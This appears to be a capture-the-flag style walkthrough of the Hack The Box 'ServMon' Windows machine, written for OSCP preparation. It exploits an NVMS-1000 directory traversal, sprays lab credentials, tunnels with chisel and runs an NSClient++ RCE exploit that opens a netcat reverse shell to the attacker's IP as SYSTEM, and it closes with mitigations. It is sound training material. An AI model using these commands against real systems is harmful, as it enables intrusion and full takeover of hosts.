---
title: Servmon
date: 2025-05-29
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, Windows, NVMS-1000, LFI, NSClient++-rce] 
image: servmon.png
media_subpath: /assets/img/posts/2025-05-29-servmonHTB/
---

## Introduction

In this walkthrough, I tackled the *ServMon* machine, an easy-rated Windows target. The HTTP server was running NVMS-1000, which was vulnerable to a Local File Inclusion (LFI) vulnerability. I leveraged this to access a list of passwords on a user's desktop. One of the credentials worked over SSH for another user.

After gaining initial access, I enumerated the system and found the password for `NSClient++`, a local monitoring agent. To access its web interface, I used `chisel` to create a tunnel. NSClient++ had functionality that allowed command execution as `NT AUTHORITY\SYSTEM`. Exploiting this feature, I achieved a SYSTEM-level shell.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 21

Anonymous access is allowed I found:

- **Nadine**
    
    ```bash
    Nathan,
    
    I left your Passwords.txt file on your Desktop.  
    Please remove this once you have edited it yourself and place it back into the secure folder.
    
    Regards
    
    Nadine
    ```
    
- **Nathan**
    
    ```bash
    1) Change the password for NVMS - Complete
    2) Lock down the NSClient Access - Complete
    3) Upload the passwords
    4) Remove public access to NVMS
    5) Place the secret files in SharePoint 
    ```
    

### Port 22

We usually skip SSH.

### Port 139/445

- **smbclient**
    
    ```bash
    smbclient -L //$IP/ -N
    ```
    
    **NT_STATUS_ACCESS_DENIED**
    
- enum4linux
    
    ```bash
    enum4linux $IP
    ```
    
    **no result**
    

### Port 5666

## Web

### Port 80

### Port 8443

## Exploitation

I am greeted with login panel for `NVMS 1000` software searching for its vulnerabilities I found the following:

[NVMS 1000 - Directory Traversal](https://www.exploit-db.com/exploits/47774)

I checked it and it worked:

![image.png](image%201.png)

I tried reading passwords that were mentioned before:

![image.png](image%202.png)

I checked credentials with users and got a hit:

```bash
sudo nxc smb $IP -u users -p passwords --continue-on-success
```

![image.png](image%203.png)

Using these credentials in SSH connection I can connect to the target.

## Privilege Escalation

Analyzing the application under `c:\Program Files\NSClient++` we see config file `nsclient.ini` in that file we can find password for its interface.

![image.png](image%204.png)

Checking the version of NSClient++ I see;

```bash
.\nscp.exe --version
```

![image.png](image%205.png)

I found the following exploit for it:

[NSClient++ 0.5.2.35 - Authenticated Remote Code Execution](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.exploit-db.com/exploits/48360&ved=2ahUKEwjzraGs88iNAxVhhv0HHW9CL7AQFnoECBoQAQ&usg=AOvVaw0b941HqPwU8-IaBNEns4_O)

[NSClient 0.5.2.35 Exploit / Privilege-Escalation](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation&ved=2ahUKEwjzraGs88iNAxVhhv0HHW9CL7AQFnoECCEQAQ&usg=AOvVaw354RCEtlZ0eep49R6QLVMX)

According to Nathan he closed public access to NSFClien++ maybe that’s why we cannot access it even trying all passwords obtained.

Let’s make port forwarding of that port and see if it works:

```bash
./chisel_1.10.1_linux_amd64 server --reverse --port 1234 -v #linux

.\chisel.exe client 10.10.14.12:1234 R:8443:127.0.0.1:8443 #target
```

Now I can access the application with provided password:

![image.png](image%206.png)

First I transferred `nc64.exe` to the target and then using this exploit [NSClient++ 0.5.2.35 - Authenticated Remote Code Execution](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.exploit-db.com/exploits/48360&ved=2ahUKEwjzraGs88iNAxVhhv0HHW9CL7AQFnoECBoQAQ&usg=AOvVaw0b941HqPwU8-IaBNEns4_O) I got an NT Authority\System shell.

```bash
python 48360.py -t 127.0.0.1 -P 8443 -p ew2x6SsGTxjRwXOT -c 'c:\tools\nc64.exe 10.10.14.12 21 -e cmd'
```

![image.png](image%207.png)

![image.png](image%208.png)

## Credentials

```bash
Nadine : L1k3B1gBut7s@W0rk

NSCLient++ - ew2x6SsGTxjRxXOT
```

## Mitigation

- Apply security patches for NVMS-1000 and avoid exposing such applications to the internet.
- Restrict access to sensitive files and use proper file permissions.
- Avoid storing plaintext credentials on disk.
- Secure remote monitoring tools like NSClient++ by disabling script execution features or restricting them to trusted users.
- Use firewalls and tunneling restrictions to prevent unauthorized internal network access.
